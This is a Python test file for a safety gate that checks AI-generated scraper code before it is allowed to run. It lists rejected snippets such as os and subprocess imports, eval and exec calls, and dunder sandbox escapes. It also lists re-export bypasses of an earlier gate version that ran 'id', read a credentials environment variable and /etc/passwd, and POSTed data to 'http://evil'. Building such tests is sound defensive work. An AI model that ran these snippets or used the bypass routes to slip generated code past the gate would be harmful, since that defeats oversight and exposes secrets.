"""AST safety-gate tests — the guardrail that stands between AI-generated code
and execution. A known-good adapter passes; every known-bad pattern is rejected.
Pure, no network — runs in tests.yml on every push.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT))

from aiconfig.safety import check_source  # noqa: E402


GOOD_ADAPTER = '''
from __future__ import annotations

import re
from typing import Iterator

from adapters.base import FetchSpec
from classifieds import extract, http


def parse_search_html(html: str, base_url: str) -> list:
    return extract.links(html, base_url, re.compile(r"/grant/"))


def parse_detail_html(html: str, url: str) -> dict:
    tags = extract.meta_tags(html)
    return {"url": url, "data": {"title": tags.get("og:title", "")}}


class GrantsAdapter:
    key = "acme_grants"
    label = "Acme Grants"

    def fetch(self, spec: FetchSpec) -> Iterator[dict]:
        session = http.polite_session()
        for start in spec.start_urls:
            page = http.get(session, start).text
            for link in parse_search_html(page, start):
                detail = http.get(session, link).text
                yield parse_detail_html(detail, link)


ADAPTER = GrantsAdapter()
'''


def test_good_adapter_passes():
    result = check_source(GOOD_ADAPTER)
    assert result["passed"] is True, result["findings"]
    assert result["findings"] == []


BAD_SNIPPETS = {
    "import os": "import os",
    "import subprocess": "import subprocess",
    "import socket": "import socket",
    "import requests": "import requests",
    "import urllib.request": "import urllib.request",
    "from os import system": "from os import system",
    "importlib": "from importlib import import_module",
    "eval": "x = eval('1+1')",
    "exec": "exec('y = 1')",
    "compile": "compile('1', '<s>', 'eval')",
    "dunder_import": "m = __import__('os')",
    "open_write": "open('/tmp/x', 'w')",
    "getattr_escape": "g = getattr(x, '__globals__')",
    "class_escape": "b = ().__class__.__bases__",
    "subclasses": "s = type('x', (), {}).__subclasses__()",
    "builtins_name": "z = __builtins__",
    "input": "v = input('?')",
}


@pytest.mark.parametrize("name,snippet", list(BAD_SNIPPETS.items()))
def test_bad_snippet_rejected(name, snippet):
    # Wrap in a trivial module so it parses.
    src = "from __future__ import annotations\n" + snippet + "\n"
    result = check_source(src)
    assert result["passed"] is False, f"{name} should be rejected"
    assert result["findings"], f"{name} should report findings"


def test_syntax_error_is_rejected():
    result = check_source("def broken(:\n")
    assert result["passed"] is False
    assert any("syntax error" in f for f in result["findings"])


# Re-export escapes that BYPASSED an earlier version of the gate (adversarial
# review findings). Allow-listed leaf modules re-export stdlib, so allow-listing
# the module PATH alone was insufficient — these must all be rejected now.
REEXPORT_ESCAPES = {
    "import_os_symbol": "from classifieds.ai import os\nos.system('id')\n",
    "import_requests_symbol": "from classifieds.ai import requests\n",
    "import_path_symbol": "from classifieds.browser import Path\n",
    "attr_chain_os": "import classifieds.ai\nclassifieds.ai.os.system('id')\n",
    "attr_chain_environ": (
        "import classifieds.ai\n"
        "x = classifieds.ai.os.environ['GOOGLE_APPLICATION_CREDENTIALS_JSON']\n"
    ),
    "attr_chain_requests": (
        "import classifieds.ai\nclassifieds.ai.requests.post('http://evil', data={})\n"
    ),
    "adapters_path": "import adapters\nadapters.Path('/etc/passwd').read_text()\n",
    "adapters_importlib": (
        "import adapters\nadapters.importlib.import_module('os')\n"
    ),
    "read_text_attr": "from classifieds import browser\nbrowser.os.environ\n",
}


@pytest.mark.parametrize("name,snippet", list(REEXPORT_ESCAPES.items()))
def test_reexport_escape_rejected(name, snippet):
    src = "from __future__ import annotations\n" + snippet
    result = check_source(src)
    assert result["passed"] is False, f"{name} must be rejected"
    assert result["findings"], f"{name} should report findings"


def test_extra_allowed_lets_test_import_adapter_under_test():
    # A generated test may import the specific adapter module when the gate is
    # told to allow it — but nothing else widens.
    src = (
        "from __future__ import annotations\n"
        "from adapters.acme_grants import parse_detail_html\n"
        "from adapters.base import read_fixture\n"
        "def test_x():\n"
        "    assert parse_detail_html(read_fixture('acme_grants_detail.html'), 'u')\n"
    )
    assert check_source(src)["passed"] is False           # not allowed by default
    assert check_source(src, extra_allowed={"adapters.acme_grants"})["passed"] is True


def test_disallowed_relative_import_rejected():
    src = "from __future__ import annotations\nfrom .secret import x\n"
    assert check_source(src)["passed"] is False
